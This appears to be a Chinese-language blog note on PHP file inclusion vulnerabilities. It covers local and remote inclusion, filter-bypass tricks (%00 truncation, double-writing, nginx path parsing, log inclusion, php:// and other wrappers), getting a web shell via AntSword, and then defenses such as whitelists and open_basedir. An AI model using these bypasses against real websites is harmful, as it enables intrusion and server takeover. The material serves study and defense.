虚拟网站配置\n/usr/local/app/php5/lib/php.ini // PHP相关配置\n/etc/httpd/conf/httpd.conf // Apache配置文件\n/etc/my.conf // mysql 配置文件\n\n\n\n\n远程文件包含：攻击者访问玩不地址来加载远程的代码，需要php.ini中allow_url_fopen和allow_url_include要为On。而且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是php)\n\n可以包含木马文件进行getshell\n\n\n\n文件包含漏洞的利用\n读取本地文件\n\n \n\n\n  在同级目录下创建index.php和flag.php两个文件\n  \n\n可以读取flag.php文件里面的内容\n\n远程文件包含:包含远程文件地址中的木马,使用蚁剑等工具进行连接\n\n文件包含漏洞的小技巧\n大小写绕过\n文件后加入特殊字符绕过利用工具，将访问路径后加入%00，可以绕过后缀检查。或者后面加一些特殊字符例如 斜杠 点之类。\n省略后缀有些程序会将传入参数指引到其他位置，或者修改后缀名，先访问文件判断，例如不需要写后缀名。\n双写绕过当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php”，”…/“，只需再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。\nnginx目录解析漏洞当判断到中间件是nginx时，我们可以利用nginx目录解析，当我们只能上传.jpg文件时，我们无法利用，只能原文读取出来，但是发现在shell.jpg后加/xxx.php,他就能以php方式读取文件，这就是目录解析漏洞。\n包含日志文件\n伪协议包含当不能直接访问目录下文件时，可以选择利用伪协议来访问文件，伪协议有以下几种：（allow_url_fopen和allow_url_include）都为On（1）page=file://[绝对路径]当页面有file1，file2……后台会判断是否已file开头，我们可以使用此协议。（2）php:// 访问各个输入/输出流（I/O streams）php://filter用于读取源码php://input用于执行php代码，或者直接将代码写入执行。（3）zip://[绝对路径], bzip2://[绝对路径], zlib://[绝对路径]协议，都属于压缩楼，访问压缩文件中的子文件，不需要指定后缀phar:// 可以查找指定压缩包内的文件，相对路径与绝对路径都可以写（4）data: text/plain,与input类似，当我们想查看源代码时，可以将其先转换为base64文件在传到页面上就不会执行PHP了（5）http协议也可以传入外部链接，自己服务器的钓鱼网站。\n\n文件包含漏洞如何防护\n\n\n设置白名单\n代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。\n\n\n\n过滤危险字符\n由于Include/Require可以对PHP Wrapper形式的地址进行包含执行（需要配置php.ini），在Linux环境中可以通过”../../”的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。\n\n\n设置文件目录\nPHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。\n\n\n关闭危险配置\nPHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。\n\n\n","categories":["漏洞总结"],"tags":["文件包含"]}]